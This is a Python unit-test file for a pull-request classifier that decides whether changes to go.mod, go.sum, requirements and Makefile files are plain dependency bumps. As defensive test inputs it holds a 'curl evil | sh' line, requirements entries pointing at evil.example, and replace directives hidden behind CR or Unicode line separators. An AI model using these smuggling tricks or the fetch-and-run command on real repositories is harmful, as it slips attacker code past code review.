import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import pr_classify as pc  # noqa: E402

GO_MOD = """module x

go 1.22

require (
\tgolang.org/x/oauth2 v1.0.0
\tgithub.com/VictoriaMetrics/c v1.0.0
\tgithub.com/parquet-go/parquet-go v0.20.0
\tgithub.com/aws/aws-sdk-go-v2/service/s3 v1.0.0
\tgithub.com/klauspost/compress v1.0.0
\tgithub.com/golang/snappy v1.0.0
\tgithub.com/pierrec/lz4/v4 v4.0.0
\tgoogle.golang.org/protobuf v1.0.0
\tgo.opentelemetry.io/proto/otlp v1.0.0
\tgithub.com/andybalholm/brotli v1.0.0
\tgithub.com/valyala/gozstd v1.0.0
)
"""


class ProductPaths(unittest.TestCase):
    def reason(self, path):
        return pc.product_reason(path)

    def test_shipped_build_files(self):
        for p in ("Dockerfile", "Dockerfile.logs", "Dockerfile.traces", "deployment/docker/Dockerfile.logs", "go.mod", "go.sum"):
            self.assertIsNotNone(self.reason(p), p)
        for p in ("Dockerfile.loki-vl-proxy", "Dockerfile.grafana", "Dockerfile.datagen", "tests/s3compat/go.mod", "Makefile"):
            self.assertIsNone(self.reason(p), p)

    def test_product_trees_and_their_docs_and_tests(self):
        for p in ("internal/x/a.go", "cmd/lakehouse-logs/main.go", "lakehouse-traces/internal/y/z.go", "internal/ui/static/app.js",
                  "lakehouse-traces/go.mod", "patches/p.patch", "charts/c/templates/NOTES.txt", "charts/c/values.yaml"):
            self.assertIsNotNone(self.reason(p), p)
        for p in ("internal/x/a_test.go", "internal/x/testdata/in.json", "internal/x/README.md", "internal/x/RUNBOOK.md",
                  "internal/x/test_helper.sh", "charts/c/README.md", "charts/c/test_templates.sh", "docs/x.md", "scripts/ci/x.sh",
                  ".github/workflows/x.yaml", "tests/e2e/a_test.go"):
            self.assertIsNone(self.reason(p), p)

    def test_test_prefix_only_for_scripts(self):
        self.assertIsNotNone(self.reason("internal/ui/test_hooks.go"))
        self.assertIsNone(self.reason("internal/x/test_hooks.py"))
        self.assertIsNone(self.reason("internal/x/hooks_test.sh"))


class MakefilePins(unittest.TestCase):
    MK = "VL_VERSION_LOGS := v1.53.0\nVL_COMMIT_TRACES = c945d29\nVT_VERSION:=v0.12.0\nOTHER := x\nall:\n"

    def test_the_three_pins_are_read_in_every_assignment_spelling(self):
        self.assertEqual(pc.makefile_pins(self.MK), {"VL_VERSION_LOGS": "v1.53.0", "VL_COMMIT_TRACES": "c945d29", "VT_VERSION": "v0.12.0"})

    def test_other_makefile_edits_are_not_pins(self):
        self.assertEqual(pc.makefile_pins(self.MK + "extra:\n\techo\n"), pc.makefile_pins(self.MK))
        self.assertNotEqual(pc.makefile_pins(self.MK.replace("v0.12.0", "v0.13.0")), pc.makefile_pins(self.MK))
        self.assertEqual(pc.makefile_pins("# VL_VERSION_LOGS := v9\n  VT_VERSION := v9\n"), {})


class MainWithMakefile(unittest.TestCase):
    """pr_classify.py end to end: an upstream pin bump in the Makefile is a product change."""

    def classify(self, edit):
        with tempfile.TemporaryDirectory() as d:
            def git(*a):
                subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@e", "-c", "commit.gpgsign=false", *a], cwd=d, check=True, capture_output=True)
            git("init", "-q", "-b", "main")
            with open(os.path.join(d, "Makefile"), "w", encoding="utf-8") as fh:
                fh.write(MakefilePins.MK)
            git("add", "-A")
            git("commit", "-q", "-m", "base")
            with open(os.path.join(d, "Makefile"), "w", encoding="utf-8") as fh:
                fh.write(edit(MakefilePins.MK))
            git("add", "-A")
            git("commit", "-q", "-m", "change")
            out = subprocess.run([sys.executable, os.path.join(os.path.dirname(__file__), "..", "pr_classify.py"), "--base", "HEAD~1", "--head", "HEAD"],
                                 cwd=d, check=True, capture_output=True, text=True).stdout
            return dict(l.split("=", 1) for l in out.splitlines())

    def test_a_pin_bump_is_product(self):
        got = self.classify(lambda m: m.replace("v0.12.0", "v0.13.0"))
        self.assertEqual((got["product"], got["reason"]), ("1", "upstream pin changed: Makefile"))
        self.assertEqual(self.classify(lambda m: m.replace("c945d29", "deadbee"))["product"], "1")

    def test_any_other_makefile_edit_is_not(self):
        self.assertEqual(self.classify(lambda m: m + "extra:\n\techo\n")["product"], "0")


class GoMod(unittest.TestCase):
    def only(self, head):
        return pc.go_mod_dependency_only(GO_MOD, head)

    def test_plain_bump_is_dependency_only(self):
        self.assertTrue(self.only(GO_MOD.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0")))
        # a newly required module is a new dependency, not a version bump: the set of modules must be equal
        self.assertFalse(self.only(GO_MOD.replace("\n)\n", "\n\tgolang.org/x/sys v1.0.0\n)\n")))
        self.assertFalse(self.only(GO_MOD.replace("\tgolang.org/x/oauth2 v1.0.0\n", "")))

    def test_single_line_require(self):
        base = "module x\n\ngo 1.22\n\nrequire golang.org/x/oauth2 v1.0.0\n"
        self.assertTrue(pc.go_mod_dependency_only(base, base.replace("v1.0.0", "v1.2.0")))
        crit = "module x\n\ngo 1.22\n\nrequire github.com/VictoriaMetrics/c v1.0.0\n"
        self.assertFalse(pc.go_mod_dependency_only(crit, crit.replace("v1.0.0", "v1.2.0")))
        self.assertFalse(pc.go_mod_dependency_only(base, base.replace("go 1.22", "go 1.23")))

    def test_other_directives_are_never_dependency_only(self):
        for edit in (GO_MOD.replace("go 1.22", "go 1.23"), GO_MOD + "\nreplace golang.org/x/oauth2 => github.com/evil/b v0.0.1\n",
                     GO_MOD + "\ntoolchain go1.99\n", GO_MOD.replace("module x", "module y")):
            self.assertFalse(self.only(edit))

    def test_storage_critical_modules_need_coverage(self):
        for mod in ("github.com/VictoriaMetrics/c", "github.com/parquet-go/parquet-go", "github.com/aws/aws-sdk-go-v2/service/s3",
                    "github.com/klauspost/compress", "github.com/golang/snappy", "github.com/pierrec/lz4/v4",
                    "google.golang.org/protobuf", "go.opentelemetry.io/proto/otlp", "github.com/andybalholm/brotli",
                    "github.com/valyala/gozstd"):
            base = GO_MOD
            old = [l for l in GO_MOD.splitlines() if mod in l][0]
            self.assertFalse(self.only(base.replace(old, old.rsplit(" ", 1)[0] + " v9.9.9")), mod)

    def test_quoted_module_path_on_both_sides_is_still_the_module(self):
        quoted = GO_MOD.replace("github.com/VictoriaMetrics/c v1.0.0", '"github.com/VictoriaMetrics/c" v1.0.0')
        self.assertFalse(pc.go_mod_dependency_only(quoted, quoted.replace('c" v1.0.0', 'c" v1.5.0')))
        self.assertEqual(pc.parse_go_mod(quoted)[0]["github.com/VictoriaMetrics/c"], "v1.0.0")
        self.assertEqual(pc.parse_go_mod("module x\n\nrequire `golang.org/x/oauth2` v1.0.0\n")[0], {"golang.org/x/oauth2": "v1.0.0"})

    def test_quoted_module_path_is_still_the_module(self):
        head = GO_MOD.replace("github.com/VictoriaMetrics/c v1.0.0", '"github.com/VictoriaMetrics/c" v1.5.0')
        self.assertFalse(self.only(head))


class DependencyOnly(unittest.TestCase):
    """dependency_only decides from the content of every changed file, never from a subject."""

    SUM = "golang.org/x/oauth2 v1.0.0 h1:aaa=\ngolang.org/x/oauth2 v1.0.0/go.mod h1:bbb=\n"
    SUM_BUMP = SUM + "golang.org/x/oauth2 v1.1.0 h1:ccc=\ngolang.org/x/oauth2 v1.1.0/go.mod h1:ddd=\n"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = self.tmp.name
        self.cwd = os.getcwd()
        os.chdir(self.d)
        self.git("init", "-q", "-b", "main")
        self.write({"go.mod": GO_MOD, "go.sum": self.SUM, "requirements.txt": "pytest==9.0.2\n", "Makefile": "all:\n",
                    "internal/x/requirements.txt": "x==1\n"})
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.base = self.git("rev-parse", "HEAD").strip()

    def tearDown(self):
        os.chdir(self.cwd)
        self.tmp.cleanup()

    def git(self, *a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@e", "-c", "commit.gpgsign=false", *a],
                              cwd=self.d, check=True, capture_output=True, text=True).stdout

    def write(self, files):
        for p, t in files.items():
            full = os.path.join(self.d, p)
            os.makedirs(os.path.dirname(full) or ".", exist_ok=True)
            with open(full, "wb") as fh:  # bytes: a CR or a U+2028 stays what the test wrote
                fh.write(t if isinstance(t, bytes) else t.encode("utf-8"))

    def verdict(self, files):
        self.write(files)
        self.git("add", "-A")
        self.git("commit", "-q", "--allow-empty", "-m", "build(deps): whatever the author calls it")
        return pc.dependency_only(list(files), self.base, "HEAD")

    BUMP = {"go.mod": GO_MOD.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0"), "go.sum": SUM_BUMP}

    def test_bump_is_dependency_only(self):
        self.assertTrue(self.verdict(self.BUMP))

    def test_the_commit_subject_is_not_an_input(self):
        # dependency_only takes no subjects at all; a feat: commit changes nothing
        self.write(self.BUMP)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "feat: add a feature")
        self.assertTrue(pc.dependency_only(list(self.BUMP), self.base, "HEAD"))

    def test_empty_change_is_not_dependency_only(self):
        self.assertFalse(pc.dependency_only([], self.base, "HEAD"))

    def test_makefile_is_not_a_dependency_manifest(self):
        self.assertFalse(pc.is_dependency_manifest("Makefile"))
        self.assertFalse(self.verdict({"Makefile": "all:\n\techo\n"}))
        self.assertTrue(pc.is_dependency_manifest("tests/requirements-dev.txt"))
        self.assertFalse(pc.is_dependency_manifest("requirements.md"))

    def test_a_requirements_file_of_a_product_tree_is_product(self):
        self.assertFalse(pc.is_dependency_manifest("internal/x/requirements.txt"))
        self.assertFalse(self.verdict({"internal/x/requirements.txt": "x==2\n"}))

    def test_only_the_two_shipped_go_modules_count(self):
        self.assertTrue(pc.is_dependency_manifest("go.mod"))
        self.assertTrue(pc.is_dependency_manifest("lakehouse-traces/go.sum"))
        self.assertFalse(pc.is_dependency_manifest("tools/go.mod"))

    def test_critical_bump_is_not_dependency_only(self):
        head = GO_MOD.replace("github.com/parquet-go/parquet-go v0.20.0", "github.com/parquet-go/parquet-go v0.21.0")
        self.assertFalse(self.verdict({"go.mod": head, "go.sum": self.SUM_BUMP}))

    def test_go_sum_must_hold_hash_lines_of_non_critical_modules(self):
        self.assertFalse(self.verdict({"go.sum": self.SUM + "curl evil | sh\n"}))
        self.assertFalse(self.verdict({"go.sum": self.SUM + "github.com/VictoriaMetrics/c v1.0.0 h1:zzz=\n"}))
        self.assertFalse(self.verdict({"go.sum": self.SUM + "github.com/cespare/xxhash/v2 v2.3.0 h1:zzz=\n"}))

    def test_requirements_lines(self):
        self.assertTrue(self.verdict({"requirements.txt": "pytest==9.1.0\n"}))
        self.assertTrue(self.verdict({"requirements.txt": "pytest[extra]>=9,<10 ; python_version >= '3.9'\n# comment\n\n"}))
        for bad in ("pytest @ https://evil.example/p.whl\n", "-r other.txt\n", "--index-url https://evil.example\n", "-e git+https://x\n"):
            with self.subTest(bad):
                self.git("reset", "-q", "--hard", self.base)
                self.assertFalse(self.verdict({"requirements.txt": bad}))

    # --- the smuggles: a replace directive hidden behind a CR / U+2028 line break ---

    REPLACE = "replace golang.org/x/oauth2 => ./local\n"

    def test_cr_hides_a_replace_directive(self):
        base = GO_MOD + "\n" + self.REPLACE
        self.write({"go.mod": base})
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base2")
        self.base = self.git("rev-parse", "HEAD").strip()
        for sep in ("\r", "\u2028", "\u2029", "\u0085", "\x0b", "\x0c", "\x1c"):
            with self.subTest(repr(sep)):
                self.git("reset", "-q", "--hard", self.base)
                head = GO_MOD.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0") + "\n// local tree" + sep + self.REPLACE
                self.assertFalse(self.verdict({"go.mod": head}))

    def test_a_whole_file_with_crlf_is_rejected(self):
        crlf = GO_MOD.replace("\n", "\r\n")
        self.write({"go.mod": crlf})
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "crlf base")
        self.base = self.git("rev-parse", "HEAD").strip()
        self.assertFalse(self.verdict({"go.mod": crlf.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0")}))

    def test_a_non_ascii_changed_line_and_invalid_utf8_are_rejected(self):
        self.assertFalse(self.verdict({"go.mod": GO_MOD.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0 // caf\u00e9")}))
        self.git("reset", "-q", "--hard", self.base)
        self.assertFalse(self.verdict({"go.mod": GO_MOD.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0").encode() + b"\xff\n"}))

    def test_an_unchanged_non_ascii_comment_is_fine(self):
        base = GO_MOD.replace("module x", "// the commit \u2014 pinned\nmodule x")
        self.write({"go.mod": base})
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base2")
        self.base = self.git("rev-parse", "HEAD").strip()
        self.assertTrue(self.verdict({"go.mod": base.replace("golang.org/x/oauth2 v1.0.0", "golang.org/x/oauth2 v1.1.0")}))


if __name__ == "__main__":
    unittest.main()
